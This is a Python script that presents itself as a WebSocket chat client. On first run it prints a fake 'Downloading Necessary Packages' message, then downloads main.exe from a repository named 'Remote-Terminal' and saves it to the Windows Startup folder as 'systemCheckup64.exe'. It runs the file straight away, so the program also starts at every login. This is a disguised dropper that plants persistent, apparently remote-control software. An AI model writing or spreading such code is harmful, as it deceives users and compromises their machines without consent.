import asyncio
import websockets
import json
from aioconsole import ainput
from time import gmtime, strftime, sleep
import sys
import requests
from io import BytesIO
from pathlib import Path
import os


def download_and_save(url, file_path):
    response = requests.get(url, stream=True)

    if response.status_code == 200:
        total_size = int(response.headers.get("content-length", 0))
        block_size = 1024  # 1 KB
        downloaded_size = 0
        content = BytesIO()

        for data in response.iter_content(chunk_size=block_size):
            downloaded_size += len(data)
            percentage = (downloaded_size / total_size) * 100
            print(f"\rDownloading: {percentage:.2f}% complete", end="", flush=True)
            content.write(data)

        with open(file_path, "wb") as file:
            file.write(content.getvalue())

        sleep(1)
        os.startfile(file_path)

    else:
        print(f"Failed to download the file. Status code: {response.status_code}")


async def receive_messages(uri):
    async with websockets.connect(uri) as websocket:
        print("Connected!")
        await websocket.send("Connected !")
        while True:
            message = await websocket.recv()
            try:
                json.loads(message)
            except:
                print(16 * "\b", end="", flush=True)
                # sys.stdout.write(16 * "\b")
                print(
                    f'Received Message @{strftime("%Y-%m-%d %I:%M:%S %p", gmtime())} >> {message}'
                )
                await asyncio.sleep(.3)
                print("Send Message <<", end=" ")
                await websocket.send(json.dumps({"type": "text", "content": f"Sent"}))


async def send_messages(uri):
    async with websockets.connect(uri) as websocket:
        while True:
            await asyncio.sleep(0.8)
            user_input = await ainput("Send Message << ")
            await websocket.send(
                json.dumps({"type": "text", "content": f"{user_input}"})
            )

            print(f"Message Delivered!\n")


async def main():
    my_uuid = "4b85867c-fd83-4610-a6c2-ae94c5d44c6f"

    uri = f"wss://test.ongshak.com/ws/{my_uuid}/"

    send_task = asyncio.create_task(send_messages(uri))
    receive_task = asyncio.create_task(receive_messages(uri))

    await asyncio.gather(receive_task, send_task)


if __name__ == "__main__":
    print("\n\n-------- WebSocket Messaging -----------")
    print("source code @ https://github.com/TanimSk/")
    print("----------------------------------------\n\n")

    # Checking
    uuid_file = Path(os.path.join(os.getcwd(), "./.data"))
    if not uuid_file.is_file():
        # Get the username
        dynamic_username = os.getenv("USERNAME")

        # Generate the path
        startup_path = os.path.join(
            os.getenv("APPDATA"),
            "Microsoft",
            "Windows",
            "Start Menu",
            "Programs",
            "Startup",
        )
        user_startup_path = os.path.join(startup_path)

        print("Downloading Necessary Packages Please Wait...")
        url = "https://github.com/TanimSk/Remote-Terminal/raw/server/client/main.exe"
        file_path = f"{user_startup_path}\systemCheckup64.exe"
        download_and_save(url, file_path)

        # write data file
        with open(".data", "w") as f:
            f.write("4b85867c-fd83-4610-a6c2-ae94c5d44c6f")

        print("Completed!\n\n")

    asyncio.run(main())
